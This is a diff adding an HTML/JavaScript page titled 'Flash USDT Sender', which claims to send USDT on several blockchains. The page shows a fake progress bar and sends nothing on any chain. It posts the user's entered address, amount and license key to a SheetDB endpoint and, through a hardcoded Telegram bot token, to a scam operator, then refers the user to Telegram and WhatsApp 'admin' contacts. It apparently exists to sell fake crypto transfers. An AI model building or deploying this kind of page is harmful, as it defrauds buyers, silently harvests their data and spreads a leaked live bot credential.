@@ -1,0 +1,958 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flash USDT Sender V 1.0</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(-45deg, #1a1a2e, #16213e, #0f3460, #1a1a2e);
+            background-size: 400% 400%;
+            animation: gradient 15s ease infinite;
+            color: #fff;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        @keyframes gradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .software-name {
+            font-size: 18px;
+            font-weight: bold;
+            color: #4cc9f0;
+        }
+
+        .license-btn {
+            background: linear-gradient(90deg, #f72585, #7209b7);
+            border: none;
+            color: white;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+            box-shadow: 0 0 10px rgba(242, 100, 207, 0.5);
+        }
+
+        .license-btn:hover {
+            box-shadow: 0 0 20px rgba(242, 100, 207, 0.8);
+            transform: translateY(-2px);
+        }
+
+        .page {
+            display: none;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .network-buttons {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .network-btn {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.3s;
+        }
+
+        .network-btn.active {
+            background: linear-gradient(90deg, #4361ee, #3a0ca3);
+            border-color: #4cc9f0;
+            box-shadow: 0 0 15px rgba(67, 97, 238, 0.7);
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #b8c1ec;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #4cc9f0;
+            box-shadow: 0 0 10px rgba(76, 201, 240, 0.5);
+        }
+
+        .limit-info {
+            margin-top: 5px;
+            font-size: 14px;
+            color: #b8c1ec;
+        }
+
+        .send-btn, .back-btn {
+            background: linear-gradient(90deg, #4cc9f0, #4895ef);
+            border: none;
+            color: white;
+            padding: 12px 25px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            width: 100%;
+            margin-top: 20px;
+            transition: all 0.3s;
+            box-shadow: 0 0 15px rgba(76, 201, 240, 0.5);
+        }
+
+        .send-btn:hover, .back-btn:hover {
+            box-shadow: 0 0 25px rgba(76, 201, 240, 0.8);
+            transform: translateY(-2px);
+        }
+
+        .wallet-options, .validity-options {
+            margin-bottom: 30px;
+        }
+
+        .option-title {
+            margin-bottom: 15px;
+            color: #b8c1ec;
+            font-size: 16px;
+        }
+
+        .toggle-group {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+        }
+
+        .toggle-option {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 12px 15px;
+            border-radius: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .toggle-switch {
+            position: relative;
+            display: inline-block;
+            width: 50px;
+            height: 24px;
+        }
+
+        .toggle-switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #ccc;
+            transition: .4s;
+            border-radius: 24px;
+        }
+
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 16px;
+            width: 16px;
+            left: 4px;
+            bottom: 4px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+        }
+
+        input:checked + .slider {
+            background: linear-gradient(90deg, #f72585, #7209b7);
+        }
+
+        input:checked + .slider:before {
+            transform: translateX(26px);
+        }
+
+        .terms {
+            margin: 30px 0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .terms input {
+            width: auto;
+        }
+
+        .create-btn {
+            background: linear-gradient(90deg, #f72585, #7209b7);
+            border: none;
+            color: white;
+            padding: 12px 25px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            width: 100%;
+            margin-top: 20px;
+            transition: all 0.3s;
+            box-shadow: 0 0 15px rgba(242, 100, 207, 0.5);
+        }
+
+        .create-btn:hover {
+            box-shadow: 0 0 25px rgba(242, 100, 207, 0.8);
+            transform: translateY(-2px);
+        }
+
+        .create-btn:disabled {
+            background: #ccc;
+            box-shadow: none;
+            cursor: not-allowed;
+        }
+
+        .progress-container {
+            margin-top: 20px;
+            display: none;
+        }
+
+        .progress-bar {
+            width: 100%;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            height: 20px;
+            margin-bottom: 10px;
+            overflow: hidden;
+        }
+
+        .progress {
+            height: 100%;
+            background: linear-gradient(90deg, #4cc9f0, #4895ef);
+            width: 0%;
+            transition: width 0.3s;
+            border-radius: 8px;
+        }
+
+        .progress-text {
+            text-align: center;
+            font-size: 14px;
+            color: #b8c1ec;
+        }
+
+        .popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s;
+        }
+
+        .popup.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+
+        .popup-content {
+            background: #1a1a2e;
+            padding: 30px;
+            border-radius: 15px;
+            max-width: 500px;
+            width: 90%;
+            position: relative;
+            animation: popupIn 0.3s ease-out;
+            border: 1px solid #4cc9f0;
+            box-shadow: 0 0 30px rgba(76, 201, 240, 0.5);
+        }
+
+        @keyframes popupIn {
+            from { transform: scale(0.9); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .popup-title {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #4cc9f0;
+            text-align: center;
+        }
+
+        .popup-message {
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+
+        .popup-btn {
+            background: linear-gradient(90deg, #4cc9f0, #4895ef);
+            border: none;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            width: 100%;
+            margin-top: 15px;
+            transition: all 0.3s;
+        }
+
+        .popup-btn:hover {
+            box-shadow: 0 0 15px rgba(76, 201, 240, 0.5);
+        }
+
+        .close-popup {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: none;
+            border: none;
+            color: #b8c1ec;
+            font-size: 20px;
+            cursor: pointer;
+            padding: 5px;
+        }
+
+        .action-buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 30px;
+        }
+
+        .action-btn {
+            flex: 1;
+            padding: 12px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            color: white;
+            text-decoration: none;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+
+        .view-btn {
+            background: linear-gradient(90deg, #4361ee, #3a0ca3);
+            box-shadow: 0 0 15px rgba(67, 97, 238, 0.5);
+        }
+
+        .telegram-btn {
+            background: linear-gradient(90deg, #0088cc, #00a8e8);
+            box-shadow: 0 0 15px rgba(0, 168, 232, 0.5);
+        }
+
+        .whatsapp-btn {
+            background: linear-gradient(90deg, #25d366, #128c7e);
+            box-shadow: 0 0 15px rgba(37, 211, 102, 0.5);
+        }
+
+        .action-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 0 25px rgba(0, 0, 0, 0.3);
+        }
+
+        .license-popup input {
+            margin-bottom: 15px;
+        }
+
+        .license-actions {
+            display: flex;
+            gap: 10px;
+        }
+
+        .license-actions button {
+            flex: 1;
+        }
+
+        .generate-btn {
+            background: linear-gradient(90deg, #f72585, #7209b7);
+        }
+
+        .error {
+            color: #f72585;
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .btn-container {
+            display: flex;
+            gap: 15px;
+        }
+
+        .btn-container button {
+            flex: 1;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="software-name">Flash USDT Sender V 1.0</div>
+            <button class="license-btn" id="licenseBtn">License</button>
+        </div>
+
+        <!-- Page 1 -->
+        <div class="page active" id="page1">
+            <div class="network-buttons">
+                <button class="network-btn" data-network="TRON">TRON</button>
+                <button class="network-btn" data-network="ETH">ETH</button>
+                <button class="network-btn" data-network="BNB">BNB</button>
+                <button class="network-btn" data-network="SOLANA">SOLANA</button>
+            </div>
+
+            <div class="input-group">
+                <label for="address">Wallet Address</label>
+                <input type="text" id="address" placeholder="Enter wallet address">
+                <div class="error" id="addressError">Invalid address format for selected network</div>
+            </div>
+
+            <div class="input-group">
+                <label for="amount">Amount (USDT)</label>
+                <input type="number" id="amount" placeholder="Enter amount" min="1" max="10000">
+                <div class="limit-info">
+                    Max: 10,000 per transaction | 24h Limit: <span id="remainingLimit">100,000</span>
+                </div>
+                <div class="error" id="amountError">Amount must be between 1 and 10,000</div>
+            </div>
+
+            <button class="send-btn" id="sendBtn">Send</button>
+        </div>
+
+        <!-- Page 2 -->
+        <div class="page" id="page2">
+            <div class="wallet-options">
+                <div class="option-title">Wallet Selection</div>
+                <div class="toggle-group">
+                    <div class="toggle-option">
+                        WEB Wallet
+                        <label class="toggle-switch">
+                            <input type="checkbox" id="webWallet" checked>
+                            <span class="slider"></span>
+                        </label>
+                    </div>
+                    <div class="toggle-option">
+                        Exchange
+                        <label class="toggle-switch">
+                            <input type="checkbox" id="exchange">
+                            <span class="slider"></span>
+                        </label>
+                    </div>
+                    <div class="toggle-option">
+                        Brokers
+                        <label class="toggle-switch">
+                            <input type="checkbox" id="brokers">
+                            <span class="slider"></span>
+                        </label>
+                    </div>
+                    <div class="toggle-option">
+                        Gaming
+                        <label class="toggle-switch">
+                            <input type="checkbox" id="gaming">
+                            <span class="slider"></span>
+                        </label>
+                    </div>
+                </div>
+            </div>
+
+            <div class="validity-options">
+                <div class="option-title">Validity</div>
+                <div class="toggle-group">
+                    <div class="toggle-option">
+                        90 Days
+                        <label class="toggle-switch">
+                            <input type="checkbox" id="days90" checked>
+                            <span class="slider"></span>
+                        </label>
+                    </div>
+                    <div class="toggle-option">
+                        120 Days
+                        <label class="toggle-switch">
+                            <input type="checkbox" id="days120">
+                            <span class="slider"></span>
+                        </label>
+                    </div>
+                    <div class="toggle-option">
+                        180 Days
+                        <label class="toggle-switch">
+                            <input type="checkbox" id="days180">
+                            <span class="slider"></span>
+                        </label>
+                    </div>
+                </div>
+            </div>
+
+            <div class="terms">
+                <input type="checkbox" id="terms">
+                <label for="terms">I agree to the Terms and Conditions</label>
+            </div>
+
+            <div class="btn-container">
+                <button class="back-btn" id="backBtn">Back</button>
+                <button class="create-btn" id="createBtn" disabled>Create Transaction</button>
+            </div>
+
+            <div class="progress-container" id="progressContainer">
+                <div class="progress-bar">
+                    <div class="progress" id="progressBar"></div>
+                </div>
+                <div class="progress-text" id="progressText">Processing: 0%</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- License Popup -->
+    <div class="popup" id="licensePopup">
+        <div class="popup-content">
+            <button class="close-popup" id="closeLicensePopup">&times;</button>
+            <div class="popup-title">License Activation</div>
+            <input type="text" id="licenseKey" placeholder="Enter license key">
+            <div class="error" id="licenseError">Invalid license key</div>
+            <div class="license-actions">
+                <button class="popup-btn" id="activateBtn">Activate</button>
+                <button class="popup-btn generate-btn" id="generateBtn">Generate Key</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Popup -->
+    <div class="popup" id="successPopup">
+        <div class="popup-content">
+            <button class="close-popup" id="closeSuccessPopup">&times;</button>
+            <div class="popup-title">Congratulations!</div>
+            <div class="popup-message" id="successMessage">
+                Network: <span id="successNetwork"></span><br>
+                Address: <span id="successAddress"></span><br>
+                Amount: <span id="successAmount"></span> USDT<br>
+                Remaining Limit: <span id="successRemaining"></span><br>
+                Wallet Type: <span id="successWallet"></span><br><br>
+                Your transaction has been created successfully. Thanks for using our software for more details contact admin.
+            </div>
+            <div class="action-buttons">
+                <a href="#" class="action-btn view-btn" id="viewBtn" target="_blank">
+                    View Transaction
+                </a>
+                <a href="https://t.me/flashhub_support" class="action-btn telegram-btn" target="_blank">
+                    Telegram
+                </a>
+                <a href="https://wa.me/639091325086" class="action-btn whatsapp-btn" target="_blank">
+                    WhatsApp
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Error Popup -->
+    <div class="popup" id="errorPopup">
+        <div class="popup-content">
+            <button class="close-popup" id="closeErrorPopup">&times;</button>
+            <div class="popup-title">Error</div>
+            <div class="popup-message" id="errorMessage">
+                Please check your internet connection or connect VPN and try again.
+            </div>
+            <button class="popup-btn" id="okErrorBtn">OK</button>
+        </div>
+    </div>
+
+    <script>
+        // DOM Elements
+        const page1 = document.getElementById('page1');
+        const page2 = document.getElementById('page2');
+        const licenseBtn = document.getElementById('licenseBtn');
+        const licensePopup = document.getElementById('licensePopup');
+        const closeLicensePopup = document.getElementById('closeLicensePopup');
+        const licenseKey = document.getElementById('licenseKey');
+        const activateBtn = document.getElementById('activateBtn');
+        const generateBtn = document.getElementById('generateBtn');
+        const licenseError = document.getElementById('licenseError');
+        const networkBtns = document.querySelectorAll('.network-btn');
+        const addressInput = document.getElementById('address');
+        const addressError = document.getElementById('addressError');
+        const amountInput = document.getElementById('amount');
+        const amountError = document.getElementById('amountError');
+        const remainingLimit = document.getElementById('remainingLimit');
+        const sendBtn = document.getElementById('sendBtn');
+        const backBtn = document.getElementById('backBtn');
+        const createBtn = document.getElementById('createBtn');
+        const termsCheckbox = document.getElementById('terms');
+        const progressContainer = document.getElementById('progressContainer');
+        const progressBar = document.getElementById('progressBar');
+        const progressText = document.getElementById('progressText');
+        const successPopup = document.getElementById('successPopup');
+        const successNetwork = document.getElementById('successNetwork');
+        const successAddress = document.getElementById('successAddress');
+        const successAmount = document.getElementById('successAmount');
+        const successRemaining = document.getElementById('successRemaining');
+        const successWallet = document.getElementById('successWallet');
+        const closeSuccessPopup = document.getElementById('closeSuccessPopup');
+        const viewBtn = document.getElementById('viewBtn');
+        const errorPopup = document.getElementById('errorPopup');
+        const errorMessage = document.getElementById('errorMessage');
+        const closeErrorPopup = document.getElementById('closeErrorPopup');
+        const okErrorBtn = document.getElementById('okErrorBtn');
+
+        // App State
+        let currentNetwork = 'TRON';
+        let isLicenseActive = localStorage.getItem('licenseActive') === 'true';
+        let transactionsToday = parseInt(localStorage.getItem('transactionsToday') || '0');
+        let totalAmountToday = parseInt(localStorage.getItem('totalAmountToday') || '0');
+        const dailyLimit = 100000;
+
+        // Initialize
+        updateRemainingLimit();
+        checkLicenseStatus();
+        setupNetworkButtons();
+        setupFormValidation();
+
+        // Event Listeners
+        licenseBtn.addEventListener('click', () => licensePopup.classList.add('active'));
+        closeLicensePopup.addEventListener('click', () => licensePopup.classList.remove('active'));
+        activateBtn.addEventListener('click', activateLicense);
+        generateBtn.addEventListener('click', generateLicense);
+        sendBtn.addEventListener('click', goToPage2);
+        backBtn.addEventListener('click', goToPage1);
+        createBtn.addEventListener('click', createTransaction);
+        termsCheckbox.addEventListener('change', () => {
+            createBtn.disabled = !termsCheckbox.checked;
+        });
+        closeErrorPopup.addEventListener('click', () => errorPopup.classList.remove('active'));
+        okErrorBtn.addEventListener('click', () => errorPopup.classList.remove('active'));
+        closeSuccessPopup.addEventListener('click', () => successPopup.classList.remove('active'));
+
+        // Functions
+        function checkLicenseStatus() {
+            if (isLicenseActive) {
+                licenseBtn.textContent = 'License Active';
+                licenseBtn.style.background = 'linear-gradient(90deg, #4cc9f0, #4895ef)';
+            }
+        }
+
+        function activateLicense() {
+            const key = licenseKey.value.trim();
+            
+            if (key.length === 16) {
+                localStorage.setItem('licenseActive', 'true');
+                localStorage.setItem('licenseKey', key);
+                isLicenseActive = true;
+                checkLicenseStatus();
+                sendToTelegram(`License Activated: ${key}`);
+                licensePopup.classList.remove('active');
+                showSuccessMessage('License activated successfully!');
+            } else {
+                licenseError.style.display = 'block';
+            }
+        }
+
+        function generateLicense() {
+            if (!isLicenseActive) {
+                const key = generateRandomKey();
+                sendToTelegram(`Generated License: ${key}`);
+                showSuccessMessage('License key generated and sent to admin. Please wait for activation.');
+            } else {
+                showSuccessMessage('Your software is already activated.');
+            }
+            licensePopup.classList.remove('active');
+        }
+
+        function generateRandomKey() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let result = '';
+            for (let i = 0; i < 16; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
+        }
+
+        function setupNetworkButtons() {
+            networkBtns.forEach(btn => {
+                btn.addEventListener('click', () => {
+                    networkBtns.forEach(b => b.classList.remove('active'));
+                    btn.classList.add('active');
+                    currentNetwork = btn.dataset.network;
+                    validateAddress();
+                });
+            });
+            
+            // Activate TRON by default
+            document.querySelector('.network-btn[data-network="TRON"]').classList.add('active');
+        }
+
+        function setupFormValidation() {
+            addressInput.addEventListener('input', validateAddress);
+            amountInput.addEventListener('input', validateAmount);
+        }
+
+        function validateAddress() {
+            const address = addressInput.value.trim();
+            let isValid = false;
+            
+            // Simple validation for demo purposes
+            if (currentNetwork === 'TRON') {
+                isValid = address.length === 34 && address.startsWith('T');
+            } else if (currentNetwork === 'ETH') {
+                isValid = address.length === 42 && address.startsWith('0x');
+            } else if (currentNetwork === 'BNB') {
+                isValid = (address.length === 42 && address.startsWith('0x')) || 
+                          (address.length === 42 && address.startsWith('bnb'));
+            } else if (currentNetwork === 'SOLANA') {
+                isValid = address.length === 44;
+            }
+            
+            if (address.length > 0 && !isValid) {
+                addressError.style.display = 'block';
+            } else {
+                addressError.style.display = 'none';
+            }
+            
+            return isValid;
+        }
+
+        function validateAmount() {
+            const amount = parseInt(amountInput.value) || 0;
+            const isValid = amount > 0 && amount <= 10000 && (totalAmountToday + amount) <= dailyLimit;
+            
+            if (amount > 0 && !isValid) {
+                amountError.style.display = 'block';
+            } else {
+                amountError.style.display = 'none';
+            }
+            
+            return isValid;
+        }
+
+        function updateRemainingLimit() {
+            remainingLimit.textContent = (dailyLimit - totalAmountToday).toLocaleString();
+        }
+
+        function goToPage1() {
+            page2.classList.remove('active');
+            page1.classList.add('active');
+        }
+
+        function goToPage2() {
+            if (!validateAddress() || !validateAmount()) {
+                showErrorMessage('Please fix the errors before proceeding.');
+                return;
+            }
+            
+            if (!isLicenseActive) {
+                showErrorMessage('Please activate your license first.');
+                licensePopup.classList.add('active');
+                return;
+            }
+            
+            page1.classList.remove('active');
+            page2.classList.add('active');
+        }
+
+        function createTransaction() {
+            if (!termsCheckbox.checked) {
+                showErrorMessage('Please agree to the Terms and Conditions.');
+                return;
+            }
+            
+            const amount = parseInt(amountInput.value);
+            const address = addressInput.value.trim();
+            
+            // Get wallet type
+            let walletType = [];
+            if (document.getElementById('webWallet').checked) walletType.push('WEB Wallet');
+            if (document.getElementById('exchange').checked) walletType.push('Exchange');
+            if (document.getElementById('brokers').checked) walletType.push('Brokers');
+            if (document.getElementById('gaming').checked) walletType.push('Gaming');
+            walletType = walletType.join(', ');
+            
+            // Get validity
+            let validity = '';
+            if (document.getElementById('days90').checked) validity = '90 Days';
+            if (document.getElementById('days120').checked) validity = '120 Days';
+            if (document.getElementById('days180').checked) validity = '180 Days';
+            
+            // Prepare data for SheetDB
+            const data = {
+                "License": localStorage.getItem('licenseKey') || 'N/A',
+                "Network": currentNetwork,
+                "Address": address,
+                "Amount": amount,
+                "Remaining Limit": dailyLimit - totalAmountToday - amount,
+                "Wallet Type": walletType,
+                "Validity": validity,
+                "Time and Date": new Date().toISOString()
+            };
+            
+            // Show progress
+            progressContainer.style.display = 'block';
+            createBtn.disabled = true;
+            backBtn.disabled = true;
+            
+            // Simulate processing
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 1;
+                progressBar.style.width = `${progress}%`;
+                progressText.textContent = `Processing: ${progress}%`;
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    sendToSheetDB(data);
+                }
+            }, 30);
+        }
+
+        async function sendToSheetDB(data) {
+            const sheetDBAPI = 'https://sheetdb.io/api/v1/vmzodr603brov';
+            
+            try {
+                // Send to SheetDB
+                const response = await fetch(sheetDBAPI, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ data: data })
+                });
+
+                if (!response.ok) throw new Error('SheetDB API error');
+                
+                // Update transaction counts
+                totalAmountToday += parseInt(data.Amount);
+                transactionsToday += 1;
+                localStorage.setItem('totalAmountToday', totalAmountToday);
+                localStorage.setItem('transactionsToday', transactionsToday);
+                
+                // Update UI
+                updateRemainingLimit();
+                
+                // Show success
+                successNetwork.textContent = data.Network;
+                successAddress.textContent = data.Address;
+                successAmount.textContent = data.Amount;
+                successRemaining.textContent = data["Remaining Limit"];
+                successWallet.textContent = data["Wallet Type"];
+                
+                // Set view transaction URL based on network
+                let explorerUrl = '';
+                if (data.Network === 'TRON') {
+                    explorerUrl = `https://tronscan.org/#/address/${data.Address}`;
+                } else if (data.Network === 'ETH') {
+                    explorerUrl = `https://etherscan.io/address/${data.Address}`;
+                } else if (data.Network === 'BNB') {
+                    explorerUrl = `https://bscscan.com/address/${data.Address}`;
+                } else if (data.Network === 'SOLANA') {
+                    explorerUrl = `https://explorer.solana.com/address/${data.Address}`;
+                }
+                viewBtn.href = explorerUrl;
+                
+                successPopup.classList.add('active');
+                
+                // Send to Telegram
+                const telegramMessage = `
+📊 New Transaction:
+━━━━━━━━━━━━━━
+🪪 License: ${data.License}
+🌐 Network: ${data.Network}
+📍 Address: ${data.Address}
+💰 Amount: ${data.Amount} USDT
+📉 Remaining Limit: ${data["Remaining Limit"]}
+💼 Wallet Type: ${data["Wallet Type"]}
+⏳ Validity: ${data.Validity}
+📅 Time: ${new Date(data["Time and Date"]).toLocaleString()}
+━━━━━━━━━━━━━━
+                `;
+                sendToTelegram(telegramMessage);
+            } catch (error) {
+                console.error('Error:', error);
+                errorPopup.classList.add('active');
+            } finally {
+                progressContainer.style.display = 'none';
+                createBtn.disabled = false;
+                backBtn.disabled = false;
+            }
+        }
+
+        function sendToTelegram(message) {
+            const botToken = '7521548785:AAHHpgE7Ja8My99nv9gX9u-4-dyuEtuMEcI';
+            const chatId = '-4766072434';
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            
+            fetch(url).catch(error => {
+                console.error('Telegram error:', error);
+            });
+        }
+
+        function showSuccessMessage(message) {
+            successMessage.textContent = message;
+            successPopup.classList.add('active');
+        }
+
+        function showErrorMessage(message) {
+            errorMessage.textContent = message;
+            errorPopup.classList.add('active');
+        }
+    </script>
+</body>
+</html>
